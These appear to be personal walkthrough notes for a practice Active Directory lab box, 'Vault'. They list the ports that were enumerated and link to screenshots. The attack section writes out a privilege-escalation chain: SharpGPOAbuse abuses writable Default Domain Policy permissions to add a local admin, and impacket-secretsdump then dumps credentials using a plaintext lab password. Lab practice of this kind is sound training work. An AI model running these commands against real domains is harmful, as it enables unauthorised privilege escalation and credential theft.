# Vault

Sanitized practice-box notes. Folder layout matches the Obsidian template: **General Info → External (per port) → Exploit → Internal / Priv Esc → Loot**, with **Evidence** next to the phase where the screenshot was taken.

| | |
| --- | --- |
| OS (guess from ports) | Windows / AD |
| Notes | Personal walkthrough, not a spoiler-free writeup |

## Layout

- [General Info](General-Info.md)
- [Exploit](Exploit.md)
- [Loot](Loot.md)
- [External](External/) — per-port enumeration
- [Internal / Priv Esc](Internal/Priv-Esc.md)

### Ports touched

- `135-RPC`
- `139-netbios-ssn`
- `3268-ldap`
- `3269-TCPwrapped`
- `3389-RDP`
- `389-ldap`
- `49666-49826-Microsoft-Windows-RPC`
- `53-DNS`
- `593-ncacn_http`
- `5985-winrm`
- `636-TCPwrapped`
- `88-kerberos`
- `9389-mc-mnf`
- `UDP-123-ntp`
- `UDP-53-DNS`
- `UDP-88-kerberos`

## Attack notes

so Anirudh has generic write permissions on the default domain policy .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "DEFAULT DOMAIN POLICY" impacket-secretsdump vault.offsec/anirudh:SecureHM@TARGET

### Commands used

```bash
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "DEFAULT DOMAIN POLICY"
gpupdate /force
impacket-secretsdump vault.offsec/anirudh:SecureHM@TARGET
```


### References

- _(none)_

## Evidence

![Pasted image 20240727210321.png](Internal/Evidence/Pasted%20image%2020240727210321.png)

![Pasted image 20240727210308.png](Internal/Evidence/Pasted%20image%2020240727210308.png)

![Pasted image 20240727205855.png](Internal/Evidence/Pasted%20image%2020240727205855.png)

![Pasted image 20240727200619.png](Internal/Evidence/Pasted%20image%2020240727200619.png)

![Pasted image 20240727210420.png](Internal/Evidence/Pasted%20image%2020240727210420.png)

![Pasted image 20240727210006.png](Internal/Evidence/Pasted%20image%2020240727210006.png)

![Pasted image 20240727211309.png](Internal/Evidence/Pasted%20image%2020240727211309.png)

![Pasted image 20240727210517.png](Internal/Evidence/Pasted%20image%2020240727210517.png)

![Pasted image 20240727211224.png](Internal/Evidence/Pasted%20image%2020240727211224.png)

![Pasted image 20240727211209.png](Internal/Evidence/Pasted%20image%2020240727211209.png)

![Pasted image 20240727200447.png](External/Evidence/Pasted%20image%2020240727200447.png)

![Pasted image 20240727195733.png](External/Evidence/Pasted%20image%2020240727195733.png)
